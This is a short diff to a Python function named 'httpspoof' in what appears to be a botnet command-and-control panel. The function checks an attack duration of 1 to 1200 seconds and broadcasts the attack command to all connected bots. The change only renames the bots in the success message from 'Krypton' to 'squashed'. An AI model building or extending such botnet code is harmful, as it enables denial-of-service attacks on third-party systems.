@@ -13,7 +13,7 @@ def httpspoof(args, validate_time, send, client, ansi_clear, broadcast, data):
         if validate_time(secs):
             for x in xxxx.split('\n'):
                 send(client, '\x1b[3;31;40m'+ x)
-            send(client, f" {Fore.LIGHTBLACK_EX}\nAttack {Fore.LIGHTGREEN_EX}successfully{Fore.LIGHTBLACK_EX} sent to all Krypton Bots!\n")
+            send(client, f" {Fore.LIGHTBLACK_EX}\nAttack {Fore.LIGHTGREEN_EX}successfully{Fore.LIGHTBLACK_EX} sent to all squashed Bots!\n")
             broadcast(data)
         else:
             send(client, Fore.RED + '\nInvalid attack duration (1-1200 seconds)\n')
